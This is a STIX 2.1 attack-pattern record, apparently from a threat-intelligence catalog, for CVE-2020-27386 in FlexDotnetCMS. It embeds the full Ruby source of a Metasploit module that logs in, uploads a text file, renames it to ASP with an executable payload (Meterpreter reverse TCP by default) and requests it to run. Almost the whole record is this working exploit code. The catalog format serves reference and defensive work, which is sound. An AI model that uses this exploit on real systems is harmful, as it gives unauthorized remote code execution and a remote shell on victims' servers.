{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0b02b047-fe94-4744-b843-15e7f604a603",
    "created": "2024-08-14T16:54:54.936764Z",
    "modified": "2024-08-14T16:54:54.936768Z",
    "name": "FlexDotnetCMS Arbitrary ASP File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability in FlexDotnetCMS v1.5.8 and prior in order to execute arbitrary commands with elevated privileges.  The module first tries to authenticate to FlexDotnetCMS via an HTTP POST request to `/login`. It then attempts to upload a random TXT file and subsequently uses the FlexDotnetCMS file editor to rename the TXT file to an ASP file. If this succeeds, the target is vulnerable and the ASP file is generated as a copy of the TXT file which remains on the server.  Next, the module sends another request to rename the TXT file to an ASP file, this time adding the payload. Finally, the module tries to execute the ASP payload via a simple HTTP GET request to `/media/uploads/asp_payload`  Valid credentials for a FlexDotnetCMS user with permissions to use the FileManager are required. This module has been successfully tested against FlexDotnetCMS v1.5.8 running on Windows Server 2012.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/flexdotnetcms_upload_exec.rb",
            "external_id": "flexdotnetcms_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-27386"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FlexDotnetCMS Arbitrary ASP File Upload',\n        'Description' => %q{\n          This module exploits an arbitrary file upload vulnerability in\n          FlexDotnetCMS v1.5.8 and prior in order to execute arbitrary\n          commands with elevated privileges.\n\n          The module first tries to authenticate to FlexDotnetCMS via an HTTP\n          POST request to `/login`. It then attempts to upload a random TXT\n          file and subsequently uses the FlexDotnetCMS file editor to rename\n          the TXT file to an ASP file. If this succeeds, the target is\n          vulnerable and the ASP file is generated as a copy of the TXT file,\n          which remains on the server.\n\n          Next, the module sends another request to rename the TXT file to an\n          ASP file, this time adding the payload. Finally, the module tries\n          to execute the ASP payload via a simple HTTP GET request to\n          `/media/uploads/asp_payload`\n\n          Valid credentials for a FlexDotnetCMS user with permissions to use\n          the FileManager are required. This module has been successfully\n          tested against FlexDotnetCMS v1.5.8 running on Windows Server 2012.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Erik Wynter' # @wyntererik - Discovery & Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-27386'],\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'Windows (x86)', {\n              'Arch' => [ARCH_X86],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows (x64)', {\n              'Arch' => [ARCH_X64],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2020-09-28'\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to FlexDotnetCMS', '/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])\n    ]\n  end\n\n  def rename_file(res, payload)\n    # obtain tokens required for renaming the payload\n    html = res.get_html_document\n    viewstate_key = html.at('input[@id=\"__VIEWSTATEKEY\"]')\n    event_validation = html.at('input[@id=\"__EVENTVALIDATION\"]')\n    if viewstate_key.blank? || event_validation.blank? # check if tokens exist before calling their values\n      return 'no_tokens'\n    end\n\n    viewstate_key = viewstate_key['value']\n    event_validation = event_validation['value']\n\n    # rename TXT payload to ASP using the file editor, this creates a copy of the TXT file, so both have to be deleted (this happens in cleanup)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'Admin', 'Views', 'PageHandlers', 'FileEditor', 'Default.aspx'),\n      'vars_get' => { 'LoadFile' => \"/media/uploads/#{@payload_txt}\" },\n      'vars_post' => {\n        '__EVENTTARGET' => 'ctl00$ContentPlaceHolder1$Save',\n        '__VIEWSTATEKEY' => viewstate_key,\n        '__EVENTVALIDATION' => event_validation,\n        'ctl00$ContentPlaceHolder1$FileSelector$SelectedFile' => \"/media/uploads/#{@payload_asp}\",\n        'ctl00$ContentPlaceHolder1$Editor' => payload\n      }\n    })\n  end\n\n  def check\n    # used to ensure cleanup only runs against flexdotnetcms targets\n    @skip_cleanup = true\n\n    # visit login the page to get the necessary cookies\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'login/'),\n      'keep_cookies' => true\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    # the login page doesn't contain the name of the app or the author, so we're combining a bunch of checks to limit the odds of failing to flag an incorrect target\n    unless res.code == 200 && res.body.include?('<title>Login - Home</title>') && res.body.include?('<label>Email</label><br>') && res.body.include?('>Forgot my password</a>')\n      return CheckCode::Safe('Target is not a FlexDotnetCMS application.')\n    end\n\n    # get cookies and tokens necessary for authentication\n    html = res.get_html_document\n    viewstate_key = html.at('input[@id=\"__VIEWSTATEKEY\"]')\n    event_validation = html.at('input[@id=\"__EVENTVALIDATION\"]')\n    if viewstate_key.blank? || event_validation.blank? # check if tokens exist before calling their values\n      return CheckCode::Detected('Received unexpected response while trying to obtain tokens necessary for authentication from /login')\n    end\n\n    viewstate_key = viewstate_key['value']\n    event_validation = event_validation['value']\n\n    # perform login to verify if the target is a FlexDotnetCMS application\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login/'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        # ideally the % in the line below would not be encoded, but I don't know how to achieve that without reverting to send_request_raw, which is ugly, and this works\n        'LoginControl$ctl00' => 'LoginControl$ctl01%7CLoginControl$LoginButton',\n        '__EVENTTARGET' => 'LoginControl$LoginButton',\n        '__VIEWSTATEKEY' => viewstate_key,\n        'LoginControl$Username' => datastore['USERNAME'],\n        'LoginControl$Password' => datastore['PASSWORD'],\n        '__EVENTVALIDATION' => event_validation,\n        '__ASYNCPOST' => 'true'\n      }\n    })\n\n    unless res\n      return CheckCode::Detected('Connection failed')\n    end\n\n    unless res.code == 200 && res.body.include?('pageRedirect||%2fadmin')\n      return CheckCode::Detected('Failed to authenticate to the server.')\n    end\n\n    # visit the backend dashboard\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'Admin/')\n\n    unless res\n      return CheckCode::Detected('Connection failed')\n    end\n\n    unless res.code == 200 && res.body.include?('Welcome to your site editor:')\n      return CheckCode::Detected('Received unexpected response while trying to follow redirect to /Admin/')\n    end\n\n    print_good('Successfully authenticated to FlexDotnetCMS')\n\n    # prepare to upload a TXT file and rename it to an ASP file. If this works, the target is vulnerable.\n    # generate file names and post data\n    @payload_txt = \"#{rand_text_alphanumeric(6..10)}.txt\"\n    @payload_asp = @payload_txt.split('.txt')[0] << '.asp'\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('\\\\media\\\\uploads\\\\', nil, nil, 'form-data; name=\"folder\"')\n    post_data.add_part(rand_text_alpha(10..20), 'text/plain', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{@payload_txt}\\\"\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'Scripts', 'tinyfilemanager.net', 'dialog.aspx'),\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'headers' => {\n        'Accept' => 'application/json',\n        'X-Requested-With' => 'XMLHttpRequest',\n        'X-File-Name' => @payload_txt\n      },\n      'vars_get' => {\n        'cmd' => 'upload'\n      },\n      'data' => post_data.to_s\n    })\n\n    @skip_cleanup = false # cleanup only has to run if at least one attempt to upload a file has been made\n\n    vprint_status(\"Uploading test file #{@payload_txt}...\")\n\n    unless res\n      return CheckCode::Detected(\"Connection failed while trying to upload test file #{@payload_txt}\")\n    end\n\n    unless res.code == 200\n      return CheckCode::Detected(\"Received unexpected response while trying to upload test file #{@payload_txt}\")\n    end\n\n    # load the test file in the file editor in order to obtain tokens required for renaming it\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'Admin', 'Views', 'PageHandlers', 'FileEditor', 'Default.aspx'),\n      'vars_get' => { 'LoadFile' => \"/media/uploads/#{@payload_txt}\" }\n    })\n\n    unless res\n      return CheckCode::Detected(\"Connection failed while trying to open test file #{@payload_txt} in the file editor\")\n    end\n\n    unless res.code == 200 && res.body.include?('Successfully loaded file')\n      return CheckCode::Detected(\"Received unexpected response while trying to open test file #{@payload_txt} in the file editor\")\n    end\n\n    # FlexDotNetCMS displays the full installation path on the server in response to the previous GET request, so we can print it\n    flexdotnetcms_path = res.body.scan(/jQuery\\.jGrowl\\(\"Successfully loaded file \\( (.*?)WebApplication/).flatten.first\n    unless flexdotnetcms_path.blank?\n      print_status(\"FlexDotnetCMS is installed on the target at #{flexdotnetcms_path}\")\n    end\n\n    print_status(\"Uploaded test file #{@payload_txt}. Attempting to rename the file to #{@payload_asp}...\")\n    res = rename_file(res, rand_text_alpha(10..20))\n    if res == 'no_tokens'\n      return CheckCode::Detected(\"Received unexpected response while trying to obtain tokens necessary for renaming #{@payload_txt}\")\n    end\n\n    unless res\n      return CheckCode::Detected(\"Connection failed while trying to rename the test file #{@payload_txt}.\")\n    end\n\n    unless res.code == 200 && res.body.include?('jQuery.jGrowl(\"Successfully saved') && res.body.include?(\"/media/uploads/#{@payload_asp}\")\n      vprint_status(\"Failed to use the file editor to rename test file #{@payload_txt} to #{@payload_asp}\")\n      return CheckCode::Safe('Target is FlexDotnetCMS v1.5.9 or higher')\n    end\n\n    print_good(\"Successfully renamed test file #{@payload_txt} to #{@payload_asp} (this is a copy of #{@payload_txt}, which remains on the server)\")\n\n    return CheckCode::Vulnerable('Target is FlexDotnetCMS v1.5.8 or lower.')\n  end\n\n  def rename_test_file_and_add_payload\n    print_status(\"Renaming #{@payload_txt} to #{@payload_asp} again, this time adding the payload\")\n\n    # load the file in the file editor in order to obtain tokens required for renaming it\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'Admin', 'Views', 'PageHandlers', 'FileEditor', 'Default.aspx'),\n      'vars_get' => { 'LoadFile' => \"/media/uploads/#{@payload_txt}\" }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, \"Connection failed while trying to open #{@payload_txt} in the file editor\")\n    end\n\n    unless res.code == 200 && res.body.include?('Successfully loaded file')\n      fail_with(Failure::UnexpectedReply, \"Received unexpected response while trying to open #{@payload_txt} in the file editor\")\n    end\n\n    # genenerate ASP payload, then rename the TXT file again while adding the payload\n    exe = generate_payload_exe\n    payload = Msf::Util::EXE.to_exe_asp(exe).to_s\n    res = rename_file(res, payload)\n    if res == 'no_tokens'\n      fail_with(Failure::UnexpectedReply, \"Received unexpected response while trying to obtain tokens necessary for renaming #{@payload_txt}\")\n    end\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to add the ASP payload.')\n    end\n\n    unless res.code == 200 && res.body.include?('jQuery.jGrowl(\"Successfully saved') && res.body.include?(\"/media/uploads/#{@payload_asp}\")\n      fail_with(Failure::Unknown, 'Failed to add the ASP payload.')\n    end\n\n    print_good(\"Successfully added the ASP payload to #{@payload_asp}\")\n  end\n\n  def cleanup\n    # only run when at least one attempt to upload a file has been made\n    return if @skip_cleanup\n\n    # delete uploaded TXT and ASP files\n    [@payload_txt, @payload_asp].each do |file|\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'Scripts', 'tinyfilemanager.net', 'dialog.aspx'),\n        'vars_get' => {\n          'cmd' => 'delfile',\n          'file' => \"\\\\media\\\\uploads\\\\#{file}\",\n          'currpath' => '\\\\media\\\\uploads\\\\'\n        }\n      })\n\n      unless res && res.code == 200 && res.body.exclude?(file)\n        print_error(\"Failed to delete #{file}.\")\n        print_warning(\"Manual cleanup of #{file} is required.\")\n        next\n      end\n\n      print_good(\"Successfully deleted #{file}\")\n    end\n  end\n\n  def exploit\n    rename_test_file_and_add_payload\n    print_status('Executing the payload...')\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'media', 'uploads', @payload_asp.to_s)\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to execute the payload.')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Received unexpected response while trying to execute the payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-09-28",
    "x_mitre_platforms": [
        "win'"
    ]
}